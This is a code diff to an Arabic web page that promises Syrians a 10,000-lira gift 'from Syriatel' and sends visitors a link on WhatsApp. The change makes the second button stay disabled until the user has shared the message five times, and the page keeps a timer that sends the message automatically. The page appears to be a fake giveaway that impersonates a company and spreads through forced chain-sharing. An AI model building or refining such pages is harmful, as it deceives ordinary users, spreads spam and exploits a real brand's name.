@@ -70,6 +70,10 @@
             color: #ffc107;
             text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.5);
         }
+        button:disabled {
+            background-color: #ddd;
+            cursor: not-allowed;
+        }
     </style>
 </head>
 <body>
@@ -84,8 +88,8 @@
     </ul>
     <p><strong>ملاحظة:</strong> يرجى عدم ضغط زر 2 حتى تقوم بمشاركة المنشور لخمس أشخاص كي تصلك الهدية.</p>
     <div class="buttons">
-        <button onclick="shareOnWhatsApp()">زر 1: شارك عبر واتس آب</button>
-        <button onclick="copyAndShare()">زر 2: نسخ النص والرابط ومشاركته</button>
+        <button id="shareBtn" onclick="shareOnWhatsApp()">زر 1: شارك عبر واتس آب</button>
+        <button id="copyBtn" onclick="copyAndShare()" disabled>زر 2: نسخ النص والرابط ومشاركته</button>
     </div>
     <p id="timer-message">سيتم إرسال الرسالة تلقائيًا بعد <span id="timer">10</span> ثوانٍ...</p>
 
@@ -95,11 +99,20 @@
         const delay = 10; // عدد الثواني قبل الإرسال التلقائي
         const siteLink = "https://azaamazeez.github.io/Newaa/"; // رابط الموقع
         const fullMessage = `أهلاً بك في سوريا الجديدة. نقدم لكل مواطن سوري مبلغ قدره 10000 عشرة آلاف ليرة هدية مقدمة من سيريتيل.\n\nرابط الموقع: ${siteLink}`;
+        
+        let shareCount = 0; // عدد المشاركات
 
         // وظيفة مشاركة الرسالة عبر واتس آب
         function shareOnWhatsApp() {
+            // كلما شارك المستخدم، ازداد العد
+            shareCount++;
+            // تمكين زر 2 إذا كانت المشاركات 5 أو أكثر
+            if (shareCount >= 5) {
+                document.getElementById("copyBtn").disabled = false;
+            }
             const whatsappUrl = `https://wa.me/?text=${encodeURIComponent(fullMessage)}`;
             window.open(whatsappUrl, "_blank");
+            alert(`تمت المشاركة! عدد المشاركات الحالية: ${shareCount}`);
         }
 
         // وظيفة نسخ النص والرابط ومشاركته عبر واتس آب
